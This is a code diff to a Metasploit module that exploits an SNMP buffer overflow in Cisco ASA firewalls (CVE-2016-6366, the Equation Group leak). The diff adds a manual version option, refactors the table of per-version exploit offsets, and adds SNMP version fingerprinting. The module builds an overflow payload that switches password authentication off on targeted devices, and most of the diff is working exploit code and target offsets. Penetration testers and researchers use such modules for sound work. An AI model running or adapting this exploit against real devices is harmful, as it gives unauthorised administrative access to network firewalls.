@@ -23,6 +23,7 @@ class MetasploitModule < Msf::Auxiliary
           'Nate Caroe <nate.caroe@risksense.com>',
           'Dylan Davis <dylan.davis@risksense.com>',
           'William Webb <william_webb[at]rapid7.com>', # initial module and ASA hacking notes
+          'Jeff Jarmoc <jjarmoc>', # minor improvements
           'Equation Group',
           'Shadow Brokers'
         ],
@@ -34,17 +35,22 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'License'     => MSF_LICENSE
     )
+
+    @offsets = version_offsets()
+
     register_options([
+      OptEnum.new('ASAVER', [ false, 'Target ASA version (default autodetect)', 'auto', ['auto']+@offsets.keys]),
       OptEnum.new('MODE', [ true, 'Enable or disable the password auth functions', 'pass-disable', ['pass-disable', 'pass-enable']])
     ], self.class)
 
     deregister_options("VERSION")
     datastore['VERSION'] = '2c' # SNMP v. 2c required it seems
+  end
 
-    @asa_version_snmp = '1.3.6.1.2.1.47.1.1.1.1.10.1'
-
-    @offsets = {
-      #"9.2(4)14" => ["197.207.10.8", "118.97.40.9", "72", "0.16.185.9", "112.31.185.9", "85.49.192.137", "0.80.8.8", "240.95.8.8", "85.137.229.87"],
+  def version_offsets()
+    # Payload offsets for supported ASA versions.
+    #     See https://github.com/RiskSense-Ops/CVE-2016-6366
+    return {
       "9.2(4)13" => ["197.207.10.8", "70.97.40.9", "72", "0.16.185.9", "240.30.185.9", "85.49.192.137", "0.80.8.8", "240.95.8.8", "85.137.229.87"],
       "9.2(4)" => ["101.190.10.8", "54.209.39.9", "72", "0.48.184.9", "192.52.184.9", "85.49.192.137", "0.80.8.8", "0.91.8.8", "85.137.229.87"],
       "9.2(3)" => ["29.112.29.8",      # jmp_esp_offset, 0
@@ -56,7 +62,6 @@ class MetasploitModule < Msf::Auxiliary
                    "0.80.8.8",         # admauth_bounds, 6
                    "64.90.8.8",        # admauth_offset, 7
                    "85.137.229.87"],   # admauth_code,   8
-
       "9.2(2)8" => ["21.187.10.8", "54.245.39.9", "72", "0.240.183.9", "16.252.183.9", "85.49.192.137", "0.80.8.8", "64.90.8.8", "85.137.229.87"],
       "9.2(1)" => ["197.180.10.8", "54.118.39.9", "72", "0.240.182.9", "16.252.182.9", "85.49.192.137", "0.80.8.8", "176.84.8.8", "85.137.229.87"],
       "9.1(1)4" => ["173.250.27.8", "134.177.3.9", "72", "0.112.127.9", "176.119.127.9", "85.49.192.137", "0.48.8.8", "96.49.8.8", "85.137.229.87"],
@@ -90,13 +95,11 @@ class MetasploitModule < Msf::Auxiliary
       "8.0(3)" => ["141.123.131.9", "156.138.160.8", "88", "0.128.9.9", "112.130.9.9", "85.49.192.137", "0.96.6.8", "176.96.6.8", "85.137.229.87"],
       "8.0(2)" => ["155.222.211.8", "44.103.159.8", "88", "0.224.6.9", "32.237.6.9", "85.49.192.137", "0.80.6.8", "48.90.6.8", "85.137.229.87"]
     }
-
   end
 
   def check
     begin
-      snmp = connect_snmp
-      vers_string = snmp.get_value(@asa_version_snmp).to_s
+      vers_string = get_asa_version()
     rescue ::Exception => e
       print_error("Error: Unable to retrieve version information")
       return Exploit::CheckCode::Unknown
@@ -157,13 +160,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run()
-
     begin
       mode = datastore['MODE']
       session = rand(255) + 1
 
-      snmp = connect_snmp
-      vers_string = snmp.get_value(@asa_version_snmp).to_s
+      vers_string = get_asa_version()
 
       print_status("Building #{mode} payload for version #{vers_string}...")
       overflow = build_payload(vers_string, mode)
@@ -194,6 +195,26 @@ class MetasploitModule < Msf::Auxiliary
     ensure
       disconnect_snmp
     end
+  end
+
+  def get_asa_version()
+    return datastore['ASAVER'] unless (datastore['ASAVER'] == 'auto')
+    vprint_status("Fingerprinting via SNMP...")
+
+    asa_version_oid = '1.3.6.1.2.1.47.1.1.1.1.10.1'
+    mib2_sysdescr_oid = '1.3.6.1.2.1.1.1.0'
+
+    snmp = connect_snmp
+    ver = snmp.get_value(asa_version_oid).to_s
+    vprint_status("OID #{asa_version_oid} yields #{ver}")
+
+    if (ver == "noSuchInstance")
+      # asa_version_snmp OID isn't available on some models, fallback to MIB2 SysDescr
+      ver = snmp.get_value(mib2_sysdescr_oid).rpartition(' ').last
+      vprint_status("OID #{mib2_sysdescr_oid} yields #{ver}")
+    end
+
+    ver
   end
 
 end
